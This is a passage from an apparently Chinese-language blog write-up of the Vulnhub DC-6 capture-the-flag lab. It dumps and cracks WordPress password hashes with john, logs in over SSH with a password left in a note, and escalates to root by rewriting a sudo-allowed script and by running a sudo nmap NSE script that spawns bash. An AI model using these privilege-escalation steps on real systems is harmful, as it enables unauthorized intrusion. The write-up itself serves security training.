ID,user_login,user_pass,user_nicename from wp_users;<br>&lt;ct ID,user_login,user_pass,user_nicename,user_activation_key from wp_users; <br>+----+------------+------------------------------------+---------------+<br>| ID | user_login | user_pass                          | user_nicename |<br>+----+------------+------------------------------------+---------------+<br>|  1 | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         |<br>|  2 | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        |<br>|  3 | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          |<br>|  4 | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ | sarah         |<br>|  5 | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          |<br>+----+------------+------------------------------------+---------------+<br>5 rows in set (0.00 sec)<br><br>MariaDB [wordpressdb]&gt; <br></code></pre></td></tr></table></figure>
+<p>john 破解：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat passwd.txt</span>                                                   <br>admin:$P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1<br>graham:$P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41<br>mark:$P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/<br>sarah:$P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/<br>jens:$P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt</span><br>Using default input encoding: UTF-8<br>Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>helpdesk01       (mark)<br>1g 0:01:36:26 DONE (2022-07-11 23:59) 0.000172g/s 2478p/s 11232c/s 11232C/s  joefeher..*7¡Vamos!<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure>
+<p>未爆破出其他用户，且 mark 用户的密码也不能 SSH 登录</p>
+<p>在用户目录下查找信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html$ ls /home<br>ls /home<br>graham  jens  mark  sarah<br>www-data@dc-6:/var/www/html$ cd /home<br>cd /home<br>www-data@dc-6:/home$ ls<br>ls<br>graham  jens  mark  sarah<br>www-data@dc-6:/home$ ls graham<br>ls graham<br>www-data@dc-6:/home$ ls jens<br>ls jens<br>backups.sh<br>www-data@dc-6:/home$ cat jens/backups.sh<br>cat jens/backups.sh<br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br>www-data@dc-6:/home$ ls mark<br>ls mark<br>stuff<br>www-data@dc-6:/home$ ls -l mark<br>ls -l mark<br>total 4<br>drwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuff<br>www-data@dc-6:/home$ ls -l mark/stuff<br>ls -l mark/stuff<br>total 4<br>-rw-r--r-- 1 mark mark 241 Apr 26  2019 things-to-do.txt<br>www-data@dc-6:/home$ cat mark/stuff/things-to-do.txt<br>cat mark/stuff/things-to-do.txt<br>Things to do:<br><br>- Restore full functionality for the hyperdrive (need to speak to Jens)<br>- Buy present for Sarah&#x27;s farewell party<br>- Add new user: graham - GSo7isUM1D4 - done<br>- Apply for the OSCP course<br>- Buy new laptop for Sarah&#x27;s replacement<br>www-data@dc-6:/home$ ls /sarah<br>ls /sarah<br>ls: cannot access &#x27;/sarah&#x27;: No such file or directory<br>www-data@dc-6:/home$ ls sarah<br>ls sarah<br>www-data@dc-6:/home$ <br></code></pre></td></tr></table></figure>
+<p>在 Mark 用户目录下找到了用户 graham 的密码，SSH 登录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh graham@192.168.135.161</span>                      <br>graham@192.168.135.161&#x27;s password: <br>Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64<br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>graham@dc-6:~$ <br></code></pre></td></tr></table></figure>
+<p>查看 sudo ，发现可以无密码以 jens 用户权限执行一个文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh<br></code></pre></td></tr></table></figure>
+<p>查看是否具有写权限，发现 jens 和 graham 同属于 devs 组，而改组具有文件的写权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:/home/jens$ ls -l<br>total 4<br>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh<br>graham@dc-6:/home/jens$ id<br>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)<br>graham@dc-6:/home/jens$ cat /etc/group<br>[......]<br>graham:x:1001:<br>mark:x:1002:<br>sarah:x:1003:<br>jens:x:1004:<br>devs:x:1005:jens,graham<br></code></pre></td></tr></table></figure>
+<p>写入调用 bash 的命令，执行得到 jens 用户权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">graham@dc-6:/home/jens$ echo &quot;#!/bin/bash\n/bin/bash&quot; &gt; backups.sh <br>-bash: !/bin/bash\n/bin/bash: event not found<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br><br>graham@dc-6:/home/jens$ echo &#x27;#!/bin/bash\n/bin/bash&#x27; &gt; backups.sh<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash\n/bin/bash</span><br>graham@dc-6:/home/jens$ ./backups.sh <br>-bash: ./backups.sh: /bin/bash\n/bin/bash: bad interpreter: No such file or directory<br><br>graham@dc-6:/home/jens$ echo &#x27;#!/bin/bash&#x27; &gt; backups.sh<br>graham@dc-6:/home/jens$ echo &#x27;/bin/bash&#x27; &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ cat backups.sh <br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>/bin/bash<br><br>graham@dc-6:/home/jens$ sudo -u jens backups.sh<br><br>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:<br><br>    #1) Respect the privacy of others.<br>    #2) Think before you type.<br>    #3) With great power comes great responsibility.<br><br>[sudo] password for graham: <br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>jens@dc-6:~$ <br></code></pre></td></tr></table></figure>
+<p>查看 jens 用户 sudo，发现可以无密码以 root 用户权限执行 nmap：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap<br></code></pre></td></tr></table></figure>
+<p>尝试直接交互式提权，由于版本太高不支持：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ sudo nmap --interactive<br>nmap: unrecognized option &#x27;--interactive&#x27;<br>See the output of nmap -h for a summary of options.<br>jens@dc-6:~$ nmap --version<br><br>Nmap version 7.40 ( https://nmap.org )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select<br></code></pre></td></tr></table></figure>
+<p>以插件方式提权，成功提权并读取到 flag ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">jens@dc-6:~$ TF=$(mktemp)<br>jens@dc-6:~$ echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt; $TF<br>jens@dc-6:~$ sudo nmap --script=$TF<br><br>Starting Nmap 7.40 ( https://nmap.org ) at 2022-07-12 14:54 AEST<br>NSE: Warning: Loading &#x27;/tmp/tmp.3cEu0ssaoj&#x27; -- the recommended file extension is &#x27;.nse&#x27;.<br>root@dc-6:/home/jens# root<br>root@dc-6:/home/jens# theflag.txt<br>root@dc-6:/home/jens# <br><br>Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b <br> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P <br>  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; <br>   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) <br><br><br>Congratulations!!!<br><br>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol>
+<li>WordPress 站点：用户枚举、后台登录爆破（wpscan）</li>
+<li><code>activity_monitor</code> 插件：远程命令执行</li>
+<li>用户密码泄露</li>
+<li>sudo 提权： .sh 文件提权、nmap 提权</li>
+</ol>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/11/Penetration/Vulnhub/Part-1/0x08%20DC-5/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC：5</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/10/Penetration/Vulnhub/Part-1/0x0B%20Raven-2/">
+                        <span class="hidden-mobile">Raven：2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
